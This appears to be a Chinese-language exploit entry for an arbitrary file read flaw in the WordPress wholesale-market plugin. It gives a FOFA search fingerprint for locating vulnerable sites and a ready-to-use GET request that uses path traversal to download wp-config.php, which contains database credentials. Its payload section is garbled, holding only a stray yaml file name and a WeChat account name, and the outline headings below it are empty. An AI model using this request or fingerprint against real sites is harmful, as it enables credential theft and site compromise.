# WordPresswholesale_market存在任意文件读取漏洞

- **系统**：WordPress　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`fofa：`body="wp-content/plugins/wholesale-market"``
- **请求**：`GET /wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php HTTP/1.1`

**请求体 / payload**
```

\[wordpress-wholesale-market-fileread.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- WordPress wholesale\_market存在任意文件读取漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * wordpress wholesale-market插件